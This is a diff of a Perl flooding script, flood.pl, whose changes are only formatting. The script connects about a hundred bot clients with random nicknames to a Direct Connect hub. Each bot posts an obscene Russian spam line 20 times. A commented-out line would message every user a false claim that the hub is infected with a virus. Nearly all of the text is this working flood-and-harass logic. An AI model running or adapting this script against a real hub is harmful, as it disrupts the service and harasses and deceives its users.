@@ -29,8 +29,7 @@ print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
 $ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
 my @dc;
 for ( 0 .. 100 ) {
-     my $dc =
-   dcppp::clihub->new(
+  my $dc = dcppp::clihub->new(
     'host' => $1,
     ( $2 ? ( 'port' => $2 ) : () ),
     'Nick' => ( $ARGV[1] or int( rand(100000000) ) ),
@@ -45,7 +44,8 @@ for ( 0 .. 100 ) {
     'M'           => 'P',
   );
   #print("BOT SEND all\n"),
-    $dc->cmd('chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!'.$_) for (1..20);
+  $dc->cmd( 'chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!' . $_ )
+    for ( 1 .. 20 );
   #print("BOT SEND to $_\n"),
   #  $dc->cmd('To', $_, 'RAT HUB заражен вирусом срочно покиньте его!') for keys %{$dc->{'NickList'}};
   #  $dc->recv(); #sleep(5); $dc->recv();
